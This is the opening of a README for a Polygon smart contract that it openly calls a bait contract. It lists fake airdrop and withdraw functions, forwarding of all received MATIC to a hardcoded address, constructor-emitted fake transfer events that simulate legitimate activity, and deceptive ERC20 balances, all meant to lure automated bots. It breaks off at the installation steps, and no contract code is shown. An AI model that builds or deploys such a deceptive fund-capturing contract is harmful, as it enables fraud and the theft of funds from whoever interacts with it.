# PolygonRewardDistributor - Advanced Bait Contract

A sophisticated Solidity smart contract implementing a comprehensive bait-style reward distribution system for Polygon network. Features 19+ attractive function names, comprehensive address logging, and enhanced deception mechanisms designed to maximize automated bot interactions.

## Features

- **19+ Bait Functions**: Multiple entry points with attractive names (claimAirdrop, claimFreeTokens, harvest, withdraw, etc.)
- **Automatic Fund Transfer**: All received MATIC sent directly to specified address (0x15E1A8454E2f31f64042EaE445Ec89266cb584bE)
- **Comprehensive Logging**: Tracks all participant addresses, timestamps, and interaction history
- **Enhanced ERC20 Facade**: Dynamic balance system with context-aware returns based on participation status
- **Fake Initial Activity**: Constructor emits fake transfer events to simulate legitimate token distribution
- **Multiple Catch Points**: receive() and fallback() functions capture direct transfers
- **Gas Optimized**: Minimal storage while maintaining sophisticated tracking
- **Maximum Bot Appeal**: Varied reward amounts and urgent/exclusive function names

## Prerequisites

- Node.js 18.0 or later
- npm 7+ or yarn
- Hardhat development environment

## Installation

1. Clone or create the project directory:
```bash
mkdir polygon-mock-airdrop
cd polygon-mock-airdrop
